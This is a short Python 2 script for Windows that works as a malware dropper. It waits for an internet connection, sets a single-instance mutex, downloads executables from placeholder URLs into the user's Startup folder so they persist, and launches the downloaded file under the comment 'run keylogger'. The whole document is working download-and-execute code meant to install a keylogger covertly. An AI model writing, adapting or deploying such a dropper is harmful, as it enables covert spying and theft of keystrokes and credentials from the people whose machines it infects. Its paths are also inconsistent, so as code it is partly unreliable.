import urllib
import urllib2
import os
import subprocess

import win32event, win32api, winerror

#loop until internetconnection success
def wait_for_internet_connection():
    while True:
        try:
            response = urllib2.urlopen('http://www.google.com',timeout=3)
            return
        except urllib2.URLError:
            pass

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None

#set download path
home = os.path.expanduser("~")
path = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
path=home+path

wait_for_internet_connection()
try:
    urllib.urlretrieve("http://where your file is ?",path+"\\name the file.exe")
    urllib.urlretrieve("http://where your file is ?",home+"\\where\\you want to keep\\file.exe")
    
except:
    pass

#run keylogger
command=str(home)+"\\AppData\\Roaming\\file.exe"
subprocess.call(command,shell=True)
